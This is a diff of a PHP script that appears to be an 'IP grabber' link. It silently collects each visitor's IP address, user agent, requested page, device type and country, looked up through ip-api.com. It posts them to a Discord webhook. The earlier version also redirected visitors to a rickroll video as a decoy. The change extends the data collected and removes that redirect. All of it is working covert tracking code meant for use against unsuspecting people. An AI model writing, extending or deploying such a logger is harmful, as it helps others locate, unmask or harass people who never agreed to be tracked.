@@ -1,17 +1,80 @@
 <?php
+function getDeviceFromUserAgent($userAgent)
+{
+    $devices = array(
+        'iPhone' => 'iPhone',
+        'iPad' => 'iPad',
+        'Android' => 'Android',
+        'Windows Phone' => 'Windows Phone',
+        'Windows' => 'Windows',
+        'Macintosh' => 'Macintosh',
+        'Linux' => 'Linux'
+    );
+
+    foreach ($devices as $device => $keyword) {
+        if (strpos($userAgent, $keyword) !== false) {
+            return $device;
+        }
+    }
+
+    return '?';
+}
+function getCountryFromIP($userIP)
+{
+    $apiURL = "http://ip-api.com/json/$userIP";
+    $response = file_get_contents($apiURL);
+    if ($response !== false) {
+        $result = json_decode($response, true);
+        if ($result && $result['status'] === 'success') {
+            return $result['country'];
+        }
+    }
+    return '?';
+}
 $userIP = $_SERVER['REMOTE_ADDR'];
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
-$currentTime = date('Y-m-d H:i:s');
+$currentPage = $_SERVER['REQUEST_URI'];
+$device = getDeviceFromUserAgent($userAgent);
+$country = getCountryFromIP($_SERVER['REMOTE_ADDR']);
 
-$webhookURL = 'WEBHOOKURL'; // Replace WEBHOOKURL with your webhookurl from Discord
+$webhookURL = 'YOUR-WEBHOOK-URL'; // replace with your webhookurl
 
-$message = "```🌐: $userIP\n💻: $userAgent\n🕒: $currentTime```"; // What the message will look like
+$message = [
+    "content" => "",
+    "embeds" => [
+        [
+            "title" => "",
+            "color" => hexdec("800080"),
+            "fields" => [
 
-$data = array(
-    'content' => $message
-);
+                [
+                    "name" => "🌐 IP",
+                    "value" => $userIP,
+                    "inline" => false
+                ],
+                [
+                    "name" => "🌍 Country",
+                    "value" => $country,
+                    "inline" => true
+                ],
+                [
+                    "name" => "💻 Device",
+                    "value" => $device,
+                    "inline" => true
+                ],
+                [
+                    "name" => "📄 Page",
+                    "value" => $currentPage,
+                    "inline" => true
+                ]
 
-$dataEncoded = json_encode($data);
+            ],
+            "timestamp" => date("c")
+        ]
+    ]
+];
+
+$dataEncoded = json_encode($message);
 
 $ch = curl_init($webhookURL);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
@@ -22,12 +85,7 @@ $response = curl_exec($ch);
 curl_close($ch);
 
 if ($response === false) {
-    header('Location: https://snoopti.de/cloud/rickroll.mp4'); // Replace with the link that the user will be redirected to
     exit();
 } else {
-    header('Location: https://snoopti.de/cloud/rickroll.mp4'); // Same as above
     exit();
 }
-
-
-// by snoopti
